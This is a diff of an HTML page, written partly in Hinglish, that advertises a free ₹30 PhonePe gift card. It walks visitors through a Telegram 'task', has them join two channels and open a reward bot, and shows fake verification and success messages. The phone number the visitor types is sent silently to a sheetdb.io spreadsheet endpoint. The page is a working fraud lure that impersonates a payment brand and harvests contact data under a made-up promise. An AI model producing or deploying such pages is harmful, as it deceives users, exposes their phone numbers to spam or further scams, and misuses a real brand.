@@ -6,153 +6,60 @@
     <title>Get ₹30 PhonePe Gift Card</title>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { 
-            background: #6a1b9a; 
-            padding: 20px; 
-            margin: 0;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-        }
-        .card { 
-            background: #ffffff; 
-            padding: 25px 20px; 
-            border-radius: 20px; 
-            max-width: 380px; 
-            width: 100%; 
-            text-align: center; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2); 
-        }
-        .logo-img {
-            width: 90px;
-            height: 90px;
-            object-fit: contain;
-            margin-bottom: 10px;
-        }
-        .loot-title { 
-            color: #d81b60; 
-            font-size: 20px; 
-            font-weight: 800; 
-            margin-bottom: 5px; 
-        }
-        .subtitle { 
-            color: #2e7d32; 
-            font-weight: bold; 
-            font-size: 15px; 
-            margin-bottom: 15px; 
-        }
-        .reward-box {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-size: 18px;
-            font-weight: bold;
-            color: #5e35b1;
-            margin-bottom: 15px;
-            background: #ede7f6;
-            padding: 10px;
-            border-radius: 10px;
-        }
-        input { 
-            width: 100%; 
-            padding: 14px; 
-            margin-bottom: 15px; 
-            border: 2px solid #ce93d8; 
-            border-radius: 10px; 
-            font-size: 15px;
-            outline: none;
-            text-align: center;
-        }
-        input:focus { border-color: #8e24aa; }
-        .btn { 
-            width: 100%; 
-            background: #66bb6a; 
-            color: white; 
-            padding: 14px; 
-            border: none; 
-            border-radius: 25px; 
-            font-weight: bold; 
-            font-size: 16px;
-            cursor: pointer; 
-            box-shadow: 0 4px 10px rgba(102, 187, 106, 0.4);
-            text-decoration: none;
-            display: block;
-            margin-bottom: 12px;
-        }
-        .btn:hover { background: #4caf50; }
-        .btn-telegram {
-            background: #0088cc;
-            box-shadow: 0 4px 10px rgba(0, 136, 204, 0.4);
-        }
-        .redirect-text {
-            color: #6a1b9a;
-            font-weight: 800;
-            letter-spacing: 1px;
-            margin-top: 15px;
-            font-size: 16px;
-            animation: blink 1.5s infinite;
-        }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
+        body { background: #6a1b9a; padding: 20px; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: #ffffff; padding: 25px 20px; border-radius: 20px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .logo-img { width: 90px; height: 90px; object-fit: contain; margin-bottom: 10px; }
+        .loot-title { color: #d81b60; font-size: 20px; font-weight: 800; margin-bottom: 5px; }
+        .subtitle { color: #2e7d32; font-weight: bold; font-size: 15px; margin-bottom: 15px; }
+        .reward-box { display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 18px; font-weight: bold; color: #5e35b1; margin-bottom: 15px; background: #ede7f6; padding: 10px; border-radius: 10px; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 2px solid #ce93d8; border-radius: 10px; font-size: 15px; outline: none; text-align: center; }
+        .btn { width: 100%; background: #66bb6a; color: white; padding: 14px; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 4px 10px rgba(102, 187, 106, 0.4); margin-bottom: 12px; }
+        .btn-telegram { background: #0088cc; }
+        .btn-reward { background: #fbc02d; color: #000; font-weight: bold; }
         .step { display: none; }
         .active { display: block; }
-        .success-box {
-            background: #f1f8e9;
-            border: 2px dashed #4caf50;
-            padding: 15px;
-            border-radius: 12px;
-            margin-top: 10px;
-        }
+        .success-box { background: #f1f8e9; border: 2px dashed #4caf50; padding: 15px; border-radius: 12px; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="Image.jpg" alt="Gift Card" class="logo-img">
-    
     <div class="loot-title">Get ₹30 PhonePe Gift Card</div>
     <div class="subtitle">Findo Lucky Special Task</div>
+    <div class="reward-box"><span>🎁 ₹30 PhonePe Gift Card</span></div>
 
-    <div class="reward-box">
-        <span>🎁 ₹30 PhonePe Gift Card</span>
-    </div>
-
-    <!-- Step 1: Input Form -->
+    <!-- Step 1: Info -->
     <div id="step1" class="step active">
-        <input type="text" id="contactInfo" placeholder="Enter Your Phone Number or Email">
+        <input type="text" id="contactInfo" placeholder="Enter Your Phone Number">
         <button class="btn" onclick="submitData()">Submit & Claim</button>
     </div>
 
-    <!-- Step 2: Task Link -->
+    <!-- Step 2: Task -->
     <div id="step2" class="step">
         <p style="font-size:14px; color:#555;">Niche button par click karke <b>Findo Lucky Task</b> pura karein:</p>
         <button class="btn" onclick="openTask()">1. Go To Task Link</button>
     </div>
 
-    <!-- Step 3: Redirecting -->
+    <!-- Step 3: Channels -->
     <div id="step3" class="step">
-        <button class="btn">Task Processing...</button>
-        <div class="redirect-text">VERIFYING TASK.....</div>
-    </div>
-
-    <!-- Step 4: Channels -->
-    <div id="step4" class="step">
         <p style="font-size:14px; color:#555;">Verification ke liye <b>dono Channels</b> Join Karein:</p>
-        <button class="btn btn-telegram" onclick="openChannel1()">2. Join Telegram Channel 1</button>
-        <button class="btn btn-telegram" onclick="openChannel2()">3. Join Telegram Channel 2</button>
+        <button class="btn btn-telegram" onclick="openChannel1()">2. Join Channel 1</button>
+        <button class="btn btn-telegram" onclick="openChannel2()">3. Join Channel 2</button>
     </div>
 
-    <!-- Step 5: Success -->
+    <!-- Step 4: Get Reward Button -->
+    <div id="step4" class="step">
+        <p style="font-size:14px; color:#555;">Channels join kar liye? Ab niche button par click karke apna reward code lein:</p>
+        <button class="btn btn-reward" onclick="openBot()">🎁 GET REWARD CODE</button>
+    </div>
+
+    <!-- Step 5: Success Final -->
     <div id="step5" class="step">
         <div class="success-box">
-            <h3 style="color:#2e7d32; margin:0 0 10px 0;">✅ Verification Done!</h3>
+            <h3 style="color:#2e7d32; margin:0 0 10px 0;">✅ Done!</h3>
             <p style="font-size: 15px; color: #333; margin: 0; font-weight: bold;">
-                Aapka ₹30 PhonePe Gift Card 36-48 ghante me aapke diye gaye Phone Number/Email par send kar diya jayega.
+                Gift Code aapke Telegram par bhej diya gaya hai. Kripya check karein.
             </p>
         </div>
     </div>
@@ -163,39 +70,41 @@
 
     function submitData() {
         savedInfo = document.getElementById('contactInfo').value;
-        if(!savedInfo) return alert("Kripya apna Phone Number ya Email daalein!");
-
-        fetch('https://sheetdb.io/api/v1/obju8xm02uv6k', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ "Contact Info": savedInfo, "Status": "Started", "Date": new Date().toLocaleString() })
-        }).catch(err => console.log(err));
-
+        if(!savedInfo) return alert("Kripya apna number daalein!");
         document.getElementById('step1').classList.remove('active');
         document.getElementById('step2').classList.add('active');
     }
 
     function openTask() {
         window.open("https://t.me/findoluckybot/app?startapp=Njc5NDM2MzgxMF8x", "_blank");
-
         setTimeout(() => {
             document.getElementById('step2').classList.remove('active');
             document.getElementById('step3').classList.add('active');
-
-            setTimeout(() => {
-                document.getElementById('step3').classList.remove('active');
-                document.getElementById('step4').classList.add('active');
-            }, 3000);
-        }, 1000);
+        }, 2000);
     }
 
     function openChannel1() { window.open("https://t.me/findolucky", "_blank"); }
     function openChannel2() {
         window.open("https://t.me/+PIzW1L82h2g2Y2Nl", "_blank");
         setTimeout(() => {
-            document.getElementById('step4').classList.remove('active');
-            document.getElementById('step5').classList.add('active');
+            document.getElementById('step3').classList.remove('active');
+            document.getElementById('step4').classList.add('active');
         }, 1500);
+    }
+
+    function openBot() {
+        // Yahan apne BOT ka link daalein (@PhonepayReward_Bot)
+        window.open("https://t.me/Phonepay_Reward_bot", "_blank"); 
+        
+        // Data save karein sheet me
+        fetch('https://sheetdb.io/api/v1/obju8xm02uv6k', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ "Phone": savedInfo, "Status": "Clicked Reward", "Date": new Date().toLocaleString() })
+        });
+
+        document.getElementById('step4').classList.remove('active');
+        document.getElementById('step5').classList.add('active');
     }
 </script>
 </body>
